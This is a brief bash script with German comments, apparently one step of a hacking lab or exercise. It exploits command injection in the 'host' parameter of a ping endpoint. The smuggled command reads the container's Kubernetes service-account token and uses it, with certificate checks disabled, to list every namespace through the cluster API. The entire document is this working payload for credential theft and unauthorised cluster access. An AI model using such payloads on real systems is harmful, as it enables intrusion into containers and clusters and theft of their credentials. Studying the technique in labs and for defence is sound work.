#!/usr/bin/env bash
# ==============================================================================
# 6. KUBERNETES-API-SERVER ABFRAGEN VIA COMMAND INJECTION
# ==============================================================================
# Nutzt das im Container vorhandene Token direkt, um über den internen DNS-Namen
# (https://kubernetes.default.svc) autorisierte Anfragen an die Kubernetes-API
# zu senden. Hierbei werden alle Namespaces des Clusters aufgelistet.
#
# Erklärung der Parameter:
# -sk : Silent-Modus (-s) und Insecure-Modus (-k / Zertifikatsprüfung ignorieren)
# -H  : HTTP-Header zur Übergabe des gestohlenen Tokens ("Authorization: Bearer ...")
# grep "/metadata.name": Filtert die Ausgabe auf die Namen der Namespaces

curl -s -G "http://localhost:5000/ping" --data-urlencode \
  'host=127.0.0.1; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces' | grep "/metadata.name"
